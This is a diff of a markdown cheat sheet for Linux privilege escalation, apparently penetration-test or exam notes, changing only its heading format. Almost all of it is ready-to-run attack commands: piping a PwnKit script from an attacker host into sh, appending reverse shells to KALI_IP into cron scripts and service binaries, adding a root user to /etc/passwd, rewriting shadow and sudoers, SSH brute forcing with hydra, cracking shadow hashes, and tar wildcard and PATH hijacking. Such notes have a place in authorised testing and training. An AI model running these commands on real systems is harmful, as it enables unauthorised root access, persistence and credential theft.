@@ -1,20 +1,29 @@
-# ***LHF***
-## sudo -l
+# Linux-PrivEsc
+
+## _**LHF**_
+
+### sudo -l
+
 ```shell
 sudo -l
 # then GTFObins
 ```
-## setuid / capabilites
+
+### setuid / capabilites
+
 ```shell
 find / -perm -u=s -type f 2>/dev/null
 /usr/sbin/getcap -r / 2>/dev/null
 # then GTFObins
 ```
-## pkexec (pwnkit/polkit)
+
+### pkexec (pwnkit/polkit)
+
 ```shell
 sh -c "$(curl http://KALI_IP/linux/PwnKit.sh)"
 ```
-## Kernel Vulns
+
+### Kernel Vulns
 
 ```shell
 # os version
@@ -31,8 +40,11 @@ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." 
 
 # ALSO CHECK SETUID BINS
 ```
-# ***Manual***
-## Quick Enum
+
+## _**Manual**_
+
+### Quick Enum
+
 ```shell
 # User #
 whoami ; id
@@ -83,7 +95,9 @@ cat /etc/fstab
 mount #drives not found in /etc/fstab
 lsblk #available disks
 ```
-## File search
+
+### File search
+
 ```shell
 # Owned by current user / group
 find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null
@@ -130,7 +144,9 @@ ls -la /srv/html
 # Recrusive by owner, size and extension
 # find / -user user -size 1M -type f -name ".txt"
 ```
-## Passwords search
+
+### Passwords search
+
 ```shell
 # Search for Passwords
 # /var/www/html
@@ -161,7 +177,9 @@ journalctl -u <service_name> | grep -E "password"
 # Check below for manual tips
 # https://juggernaut-sec.com/password-hunting-lpe/#Password_Hunting_with_Tools_–_LinPEAS
 ```
-## Cron
+
+### Cron
+
 ```shell
 # Systemwide cron
 cat /etc/crontab
@@ -184,7 +202,9 @@ cat /var/log/syslog
 
 # Check linpeas.sh and pspy64
 ```
-## Services
+
+### Services
+
 ```shell
 # Search for unusual and writeable .service files
 #
@@ -225,8 +245,10 @@ cat /path/to/log | grep -E "password|key|error"
 ps aux | grep debug
 
 ```
-# ***Auto***
-## **linpeas.sh / lse.sh**
+
+## _**Auto**_
+
+### **linpeas.sh / lse.sh**
 
 ```shell
 # linpeas / lse
@@ -240,7 +262,9 @@ wget http://KALI_IP/linux/rpspy64.py
 # https://github.com/DominicBreuker/pspy
 # https://systemweakness.com/6-vs-1-battle-my-oscp-strategy-dd23cc0e912b 
 ```
-## pspy (hidden crons)
+
+### pspy (hidden crons)
+
 ```shell
 # 1 check daemon is running (if you cant find any crons in /etc/crontab or /etc/cron*)
 ps -efw | grep -i "cron"
@@ -251,27 +275,36 @@ curl http://KALI_IP/linux/pspy64 -o pspy64
 chmod +x ./pspy64
 ./pspy64
 ```
-# ***Attacks***
-## su
+
+## _**Attacks**_
+
+### su
+
 ```
 su SOMEUSER
 ```
-## bruteforce user
+
+### bruteforce user
 
 ```shell
 # min 6 max 6 length password pattern
 crunch 6 6 -t Lab%%% > wordlist
 hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
 ```
-## writeble /etc/passwd
-***If you can write to /etc/passwd, you can add an arbitrary privileged user***
+
+### writeble /etc/passwd
+
+_**If you can write to /etc/passwd, you can add an arbitrary privileged user**_
+
 ```shell
 openssl passwd password
 echo "root2:COPY_FROM_ABOVE:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
 id
 ```
-## writeable /etc/shadow
+
+### writeable /etc/shadow
+
 ```shell
 # 1 Make the password
 mkpasswd -m sha-512 password
@@ -284,11 +317,15 @@ cp /etc/shadow /home/user/shadow.bak
 # 4 Login
 su root
 ```
-## writeable sudoers
+
+### writeable sudoers
+
 ```shell
 echo "`whoami` ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
-## readable /etc/shadow
+
+### readable /etc/shadow
+
 ```shell
 # 1 Copy /etc/passwd and /etc/shadow to files "passwd.john" and "shadow.john"
 
@@ -298,24 +335,33 @@ unshadow ./passwd.john ./shadow.john > unshadowed.john
 # 3 Crack
 john ./unshadowed.john --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-## readable /root ssh keys
+
+### readable /root ssh keys
+
 ```shell
 ssh -i root_id_rsa root@`tip`
 ```
-## writable cron script
+
+### writable cron script
 
 ```shell
 echo >> user_backups.sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc KALI_IP 443 >/tmp/f" >> user_backups.sh
 cat user_backups.sh
 ```
-## writable /etc/crontab
-### A Replace script
+
+### writable /etc/crontab
+
+#### A Replace script
+
 ```shell
 * * * * * root /tmp/malicious_script.sh
 ```
-### B Writeable Path is in PATH
-***For example, if backup.sh uses "tar", we can modify the PATH to have our "tar" run***
+
+#### B Writeable Path is in PATH
+
+_**For example, if backup.sh uses "tar", we can modify the PATH to have our "tar" run**_
+
 ```shell
 # 1 Create our "tar" in the writeable path Here, we can write in /dev/shm
 echo '/bin/bash' > /tmp/tar
@@ -327,8 +373,11 @@ export PATH=/tmp:$PATH
 
 # Can replace with any payload i.e reverse shell, add root user, copy of bash etc
 ```
-### C Wildcards used
-***If the cron job executes a command with wildcards (e.g., `tar -cvf /tmp/backup.tar *`), you can exploit this by creating malicious files.***
+
+#### C Wildcards used
+
+_**If the cron job executes a command with wildcards (e.g.,****&#x20;****`tar -cvf /tmp/backup.tar *`****), you can exploit this by creating malicious files.**_
+
 ```shell
 # 1 After cding into the writeable directory 
 
@@ -346,10 +395,12 @@ echo 'cp /bin/bash /tmp && chmod +s /tmp/bash' > /tmp/malicious.sh
 touch '/tmp/--checkpoint=1'
 touch '/tmp/--checkpoint-action=exec=sh malicious.sh'
 ```
-## writeable service
-***If you find writable binaries or scripts, you can write reverse shell***
+
+### writeable service
+
+_**If you find writable binaries or scripts, you can write reverse shell**_
+
 ```shell
 echo 'bash -i >& /dev/tcp/KALI_IP/1234 0>&1' > /path/to/service_executable
 chmod +x /path/to/service_executable
 ```
-
